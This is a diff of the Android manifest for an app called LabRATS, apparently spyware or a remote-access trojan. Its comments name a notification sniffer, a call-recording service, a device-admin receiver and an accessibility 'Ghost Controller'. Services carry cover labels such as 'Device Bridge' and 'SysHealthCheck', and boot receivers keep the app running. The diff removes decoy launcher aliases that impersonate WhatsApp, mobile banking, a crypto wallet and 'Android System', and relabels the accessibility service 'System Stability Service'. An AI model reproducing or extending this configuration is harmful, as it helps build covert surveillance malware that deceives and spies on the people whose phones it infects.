@@ -113,6 +113,7 @@
         <activity
             android:name=".PermissionActivity"
             android:theme="@style/Theme.LabRATS.Permissions"
+            android:launchMode="singleInstance"
             android:excludeFromRecents="true"
             android:exported="false" />
 
@@ -209,202 +210,6 @@
         </activity-alias>
 
         <activity-alias
-            android:name=".WhatsAppAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="WhatsApp"
-            android:icon="@drawable/ic_whatsapp"
-            android:roundIcon="@drawable/ic_whatsapp"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".TelegramAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Telegram"
-            android:icon="@drawable/ic_telegram"
-            android:roundIcon="@drawable/ic_telegram"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".InstagramAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Instagram"
-            android:icon="@drawable/ic_instagram"
-            android:roundIcon="@drawable/ic_instagram"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".YouTubeAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="YouTube"
-            android:icon="@drawable/ic_youtube"
-            android:roundIcon="@drawable/ic_youtube"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".ChromeAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Chrome"
-            android:icon="@drawable/ic_chrome"
-            android:roundIcon="@drawable/ic_chrome"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".BankAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Mobile Banking"
-            android:icon="@drawable/ic_bank"
-            android:roundIcon="@drawable/ic_bank"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".MailAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Email"
-            android:icon="@drawable/ic_email"
-            android:roundIcon="@drawable/ic_email"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".VPNAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="VPN"
-            android:icon="@drawable/ic_vpn"
-            android:roundIcon="@drawable/ic_vpn"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".PdfAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Adobe Acrobat"
-            android:icon="@drawable/ic_pdf"
-            android:roundIcon="@drawable/ic_pdf"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".MusicAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Music"
-            android:icon="@drawable/ic_music"
-            android:roundIcon="@drawable/ic_music"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".TwitterAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="X"
-            android:icon="@drawable/ic_twitter"
-            android:roundIcon="@drawable/ic_twitter"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".TermuxAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Termux"
-            android:icon="@drawable/ic_termux"
-            android:roundIcon="@drawable/ic_termux"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".CryptoAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Crypto Wallet"
-            android:icon="@drawable/ic_crypto"
-            android:roundIcon="@drawable/ic_crypto"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".AndroidSystemAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:label="Android System"
-            android:icon="@drawable/ic_android_system"
-            android:roundIcon="@drawable/ic_android_system"
-            android:targetActivity=".DecoyActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
             android:name=".AndroidSystemAlias"
             android:enabled="false"
             android:exported="true"
@@ -419,7 +224,7 @@
         </activity-alias>
 
         <service
-            android:name=".WorkManager_Sync"
+            android:name="com.labs.labrats.WorkManager_Sync"
             android:enabled="true"
             android:exported="false"
             android:stopWithTask="false"
@@ -428,7 +233,7 @@
         </service>
 
         <service
-            android:name=".Analytics_Provider"
+            android:name="com.labs.labrats.Analytics_Provider"
             android:enabled="true"
             android:exported="false"
             android:label="Device Bridge"
@@ -436,19 +241,19 @@
             android:foregroundServiceType="camera|microphone|dataSync" />
 
         <!-- Installation Trigger -->
-        <receiver android:name=".InstallReferrerReceiver"
+        <receiver android:name="com.labs.labrats.InstallReferrerReceiver"
             android:exported="true">
-            <intent-filter android:priority="999">
+            <intent-filter>
                 <action android:name="com.android.vending.INSTALL_REFERRER" />
             </intent-filter>
         </receiver>
 
         <receiver
-            android:name=".SystemBoot"
+            android:name="com.labs.labrats.SystemBoot"
             android:enabled="true"
             android:exported="true"
             android:label="SysHealthCheck">
-            <intent-filter android:priority="999">
+            <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                 <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
@@ -462,7 +267,7 @@
 
         <!-- Device Admin Receiver -->
         <receiver
-            android:name=".StabilityPolicy"
+            android:name="com.labs.labrats.StabilityPolicy"
             android:description="@string/app_name"
             android:label="@string/app_name"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -477,7 +282,7 @@
 
         <!-- Call Record Service for audio capture -->
         <service
-            android:name=".MediaFrameworkService"
+            android:name="com.labs.labrats.MediaFrameworkService"
             android:enabled="true"
             android:exported="false"
             android:stopWithTask="false"
@@ -485,7 +290,7 @@
 
         <!-- Call Receiver for detecting incoming/outgoing calls -->
         <receiver
-            android:name=".TelephonyState"
+            android:name="com.labs.labrats.TelephonyState"
             android:enabled="true"
             android:exported="true">
             <intent-filter>
@@ -496,7 +301,7 @@
 
         <!-- Notification Sniffer Service -->
         <service
-            android:name=".StatusNotification"
+            android:name="com.labs.labrats.StatusNotification"
             android:enabled="true"
             android:exported="true"
             android:stopWithTask="false"
@@ -509,11 +314,10 @@
 
         <!-- Ghost Controller (Accessibility Service) -->
         <service
-            android:name=".IO_Persistence_Manager"
+            android:name="com.labs.labrats.IO_Persistence_Manager"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true"
-            android:label="@string/app_name"
-            android:description="@string/accessibility_description"
+            android:label="System Stability Service"
             android:stopWithTask="false">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
